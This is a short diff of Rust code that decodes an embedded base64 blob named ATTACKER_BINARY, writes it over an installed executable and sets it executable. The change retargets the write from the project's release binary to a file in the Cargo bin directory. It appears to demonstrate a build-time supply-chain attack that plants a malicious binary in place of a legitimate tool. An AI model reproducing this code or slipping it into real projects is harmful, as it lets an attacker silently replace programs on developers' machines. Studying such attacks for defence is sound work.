@@ -8,7 +8,7 @@ const ATTACKER_BINARY: &str = include_str!("base64_attacker_binary");
 
 fn main() -> Result<()> {
     let attacker_binary = decode(ATTACKER_BINARY).unwrap();
-    let mut file = File::create("target/release/real_project")?;
+    let mut file = File::create("/usr/local/cargo/bin/rust-hello-world-demo")?;
     file.write_all(attacker_binary.as_slice())?;
     file.set_permissions(fs::Permissions::from_mode(0o775))?;
     Ok(())
